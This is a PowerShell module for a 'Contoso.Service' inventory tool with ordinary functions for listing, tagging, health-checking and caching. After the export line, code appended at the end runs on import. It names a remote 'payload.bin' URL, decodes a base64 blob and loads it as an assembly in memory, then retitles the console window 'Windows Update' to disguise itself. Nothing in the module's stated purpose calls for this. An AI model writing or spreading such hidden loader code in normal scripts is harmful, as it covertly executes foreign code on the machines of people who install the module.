
$ErrorActionPreference = 'Stop'

$InformationPreference = 'SilentlyContinue'
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

$script:DefaultTimeout = 60
$script:ModuleVersion = '4.7.3'
function Get-ContosoService {
    <#
    .SYNOPSIS
        Returns Contoso inventory records.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        One or more object names.
    .PARAMETER Environment
        Target environment.
    #>
    [CmdletBinding()]
    [OutputType([pscustomobject])]
    param(
        [Parameter(ValueFromPipeline = $true, Mandatory = $true)]
        [string[]]$Name,

        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment = 'Prod'
    )

    begin {
        $results = [System.Collections.Generic.List[object]]::new()
    }

    process {
        foreach ($item in $Name) {
            $results.Add([pscustomobject]@{
                Name        = $item
                Environment = $Environment
                QueriedAt   = Get-Date
            })
        }
    }

    end {
        $results
    }
}

function Set-ContosoServiceTag {
    <#
    .SYNOPSIS
        Applies a tag to an existing object.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to tag.
    .PARAMETER Tag
        Tag value.
    #>
    [CmdletBinding(SupportsShouldProcess = $true)]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Tag
    )

    if ($PSCmdlet.ShouldProcess($Name, 'Apply tag')) {
        Write-Verbose ("Tagging {0} with {1}" -f $Name, $Tag)
        [pscustomobject]@{ Name = $Name; Tag = $Tag; UpdatedAt = Get-Date }
    }
}

function Test-ContosoServiceHealth {
    <#
    .SYNOPSIS
        Tests whether an object answers on its management port.
    .DESCRIPTION
        Returns data for the requested objects.
    .PARAMETER Name
        Object to probe.
    .PARAMETER Port
        TCP port to probe.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [int]$Port = 5985
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Name, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne(2000)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

function Resolve-ContosoPath {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if ([string]::IsNullOrWhiteSpace($Path)) {
        throw 'Path must not be empty.'
    }
    return [System.IO.Path]::GetFullPath($Path)
}

function Contoso-Cache {
    [CmdletBinding()]
    param([string]$Key, [object]$Value)

    if (-not $script:Cache) {
        $script:Cache = @{}
    }
    if ($PSBoundParameters.ContainsKey('Value')) {
        $script:Cache[$Key] = $Value
    }
    return $script:Cache[$Key]
}

function Get-ContosoModuleInfo {
    [CmdletBinding()]
    param()

    [pscustomobject]@{
        Module      = 'Contoso.Service'
        Version     = $script:ModuleVersion
        Timeout     = $script:DefaultTimeout
        Exported    = @('Get-ContosoService', 'Set-ContosoServiceTag', 'Test-ContosoServiceHealth')
    }
}

$script:Cache = @{}
Write-Verbose ('Cache initialised for {0}' -f 'Contoso.Service')

$script:ModuleRoot = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
Write-Verbose ('Module root: {0}' -f $script:ModuleRoot)

Write-Verbose ('Loaded module {0} version {1}' -f 'Contoso.Service', $script:ModuleVersion)

if ($ExecutionContext.SessionState.Module) {
    Write-Verbose 'Module session detected.'
}
else {
    Write-Verbose 'Script session detected.'
}

$script:ExportedFunctions = @('Get-ContosoService', 'Set-ContosoServiceTag', 'Test-ContosoServiceHealth')
Write-Verbose ('Exporting {0} functions' -f $script:ExportedFunctions.Count)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

Export-ModuleMember -Function Get-ContosoService, Set-ContosoServiceTag, Test-ContosoServiceHealth, Get-ContosoModuleInfo
$RemoteUrl = "http://198.51.100.59/payload.bin"
$ErrorActionPreference = "Stop"

$AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpsenlma3Q5NGxk")
Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
$TransferResult = [Reflection.Assembly]::Load($AssemblyBytes)
if ($null -ne $TransferResult) {
    Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
}

Start-Sleep -Seconds 4
$Host.UI.RawUI.WindowTitle = "Windows Update"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Collecting host metadata"
Write-Verbose "Inspecting process list"
